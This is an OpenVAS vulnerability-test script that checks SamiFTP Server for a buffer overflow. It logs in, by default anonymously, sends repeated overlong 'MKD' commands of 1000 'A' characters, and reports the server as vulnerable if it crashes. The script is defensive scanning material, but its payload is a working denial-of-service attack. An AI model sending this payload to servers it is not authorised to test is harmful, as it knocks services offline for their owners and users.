###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_samiftp_mkd_cmd_bof_vuln.nasl 9353 2018-04-06 07:14:20Z cfischer $
#
# SamiFTP Server 'MKD' Command Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of

# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803738");
  script_version("$Revision: 9353 $");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:14:20 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2013-08-17 16:46:05 +0530 (Sat, 17 Aug 2013)");
  script_name("SamiFTP Server 'MKD' Command Buffer Overflow Vulnerability");

 tag_summary =
"The host is running SamiFTP Server and is prone to buffer overflow
vulnerability.";

  tag_vuldetect =
"Send a crafted FTP request via 'MKD' command and check server is dead
or not.";

  tag_insight =
"The flaw is due to an unspecified error while parsing 'MKD' command.";

  tag_impact =
"Successful exploitation will allow the remote attackers to cause a denial
of service.

Impact Level: Application";

  tag_affected =
"Sami FTP Server version 2.0.1, other versions may also be affected";

  tag_solution =
"No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/27523");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/sami-ftp-201-mkd-buffer-overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  exit(0);
}


##
## The script code starts here
##

include("ftp_func.inc");

## Variable Initialization
ftplogin = "";
samiPort = "";
banner = "";
soc1 = "";
soc2 = "";
resp = "";

samiPort = get_kb_item("Services/ftp");
if(!samiPort){
  samiPort = 21;
}

## Check Port status
if(!get_port_state(samiPort)){
  exit(0);
}

## Confirm the Application
banner = get_ftp_banner(port:samiPort);
if("220 Features p a" >!< banner){
  exit(0);
}

## Get Username from KB, If not given use default Username
user = get_kb_item("ftp/login");
if(!user){
  user = "anonymous";
}

## Get Password from KB, If not given use default Password
pass = get_kb_item("ftp/password");
if(!pass){
  pass = "anonymous";
}

soc1 = open_sock_tcp(samiPort);
if(!soc1){
  exit(0);
}

ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc1);
  exit(0);
}

send(socket:soc1, data:string("MKD ", crap(length: 1000, data:'A'), '\r\n'));
ftp_close(socket:soc1);

for(i=0; i<3 ; i++)
{
  ## Open the socket
  soc1 = open_sock_tcp(samiPort);

  if(!soc1){
    break;
  }

  ## Check Login is successful or not
  ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);

  if(!ftplogin)
  {
    ftp_close(socket:soc1);
    break;
  }

  send(socket:soc1, data:string("MKD ", crap(length: 1000, data:'A'), '\r\n'));

  ## Close FTP Socket
  ftp_close(socket:soc1);
}

sleep(3);

## Server is crashed if not able to open the socket
## or not able to get the banner
soc2 = open_sock_tcp(samiPort);
if(!soc2)
{
  security_message(samiPort);
  exit(0);
}

resp = ftp_recv_line(socket:soc2);
if("220 Features p a" >!< resp)
{
  security_message(samiPort);
  exit(0);
}

# Close FTP Socket
ftp_close(socket:soc2);
